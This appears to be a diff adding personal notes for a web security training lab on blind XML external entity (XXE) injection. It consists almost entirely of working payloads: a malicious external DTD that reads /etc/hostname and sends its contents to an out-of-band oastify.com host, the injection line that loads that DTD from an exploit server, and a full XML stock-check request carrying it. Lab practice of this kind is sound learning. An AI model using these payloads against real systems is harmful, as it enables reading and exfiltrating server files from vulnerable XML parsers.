@@ -1,0 +1,18 @@
+
+2wzmho1mbt27y3asigouzbdk7bd21vpk.oastify.com
+https://exploit-0a2100e604e23bd3809aa73d01730020.exploit-server.net/exploit
+
+exploit server:
+
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://2wzmho1mbt27y3asigouzbdk7bd21vpk.oastify.com/?x=%file;'>">
+%eval;
+%exfil;
+
+
+inject payload:
+
+<!DOCTYPE test [<!ENTITY % xxe SYSTEM "https://exploit-0a2100e604e23bd3809aa73d01730020.exploit-server.net/exploit"> %xxe;]>
+
+
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "https://exploit-0a2100e604e23bd3809aa73d01730020.exploit-server.net/exploit"> %xxe;]><stockCheck><productId>1</productId><storeId>3</storeId></stockCheck>
